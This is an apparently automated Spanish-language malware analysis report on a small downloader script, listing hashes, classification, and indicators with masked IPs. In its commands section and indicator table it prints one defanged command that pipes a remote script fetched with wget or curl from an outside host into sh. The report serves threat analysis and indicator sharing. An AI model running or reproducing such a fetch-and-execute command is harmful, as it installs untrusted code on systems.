# 🧬 Payload Analysis

`19dff9d03a6b70da7258814909e5b30fe0adc9e99d2826d702c4b4737919a313`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 371 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://217.60.195.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:07:44.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `19dff9d03a6b70da7258814909e5b30fe0adc9e99d2826d702c4b4737919a313`
- **SHA1:** `f1457c2f8268f67be707ac6ad829c80bb3c1c6b2`
- **MD5:** `30cb9e4a3500836b038d678f4ee1044b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 371 B |
| Entropía | 5.12 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 190.179.172.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 19dff9d03a6b70da7258814909e5b30fe0adc9e99d2826d702c4b4737919a313 | static_analysis |
| ip | 79.76.58.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
